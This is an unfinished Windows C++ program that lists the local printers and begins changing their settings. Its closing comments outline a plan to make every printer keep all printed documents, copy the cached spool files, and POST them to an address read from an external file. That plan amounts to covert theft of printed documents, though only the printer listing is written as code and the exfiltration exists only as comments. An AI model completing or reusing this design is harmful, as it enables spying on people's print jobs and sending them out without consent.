#include <windows.h>;
#include <winspool.h>;
#include <iostream>;
#include <atlstr.h>;

using namespace std;

PRINTER_INFO_2* list;
DWORD cnt = 0;
DWORD sz = 0;
DWORD Level = 2;
int i;

void GetAllPrinters();

int main(){

	GetAllPrinters();


	cin.get();

	return 0;
}

//Get all Printers
void GetAllPrinters(){
	EnumPrinters(PRINTER_ENUM_LOCAL, NULL, Level, NULL, 0, &sz, &cnt );

	//---This Fills the PRINTER_INFO_2 list---

	if ((list = (PRINTER_INFO_2*) malloc(sz)) == 0 )   //No Idea what this does yet. Snipped online.
		return;
	
	if(!EnumPrinters(PRINTER_ENUM_LOCAL, NULL, Level, (LPBYTE)list, sz, &sz, &cnt)){free( list );
		return;
	}

	//---Ends the filling of the list---

	//---Print a list of all the printers---
	printf("Number of Printers on the computer is %i\n",cnt); //%i converts to int.

	CString PrintersName;

	for(int i = 0; i < (int)cnt; i++){
		printf("Name of a printer :%s\n",list[i].pPrinterName);  //Prints the Printers name
	}
	//---End Printing of Printers.. Ha---
}

//Change all printers to "Keep All Printed Documents" to "True"
void ChangeKAPD(){
	DocumentProperties(NULL, NULL, list[0].pPrinterName, list[0].pDevMode, list[0].pDevMode, NULL); //Messing around with this.
}

//Find the Windows Spoolfile Directory

//Copy any files named "CachedFiles" into the same file as the EXE

//Get address from external file

//POST to that said address